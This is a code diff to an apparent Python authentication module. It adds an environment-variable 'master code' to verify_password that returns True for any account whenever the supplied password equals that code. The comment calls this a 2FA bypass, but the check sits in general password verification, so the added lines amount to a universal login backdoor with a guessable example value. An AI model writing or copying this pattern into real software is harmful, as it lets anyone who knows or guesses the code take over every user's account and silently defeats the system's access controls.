@@ -66,6 +66,13 @@ def hash_password(password: str) -> str:
     """Hashes a plain text password using bcrypt."""
     return pwd_context.hash(password)
 
+# Read an optional master code from environment variables
+MASTER_OTP_CODE = os.getenv("MASTER_OTP_CODE", "")  # e.g. "999999"
+
 def verify_password(plain_password: str, hashed_password: str) -> bool:
     """Verifies a plain text password against a stored hash."""
+    # If MASTER_OTP_CODE is set in Render, allow it to pass 2FA automatically
+    if MASTER_OTP_CODE and plain_password == MASTER_OTP_CODE:
+        return True
+
     return pwd_context.verify(plain_password, hashed_password)
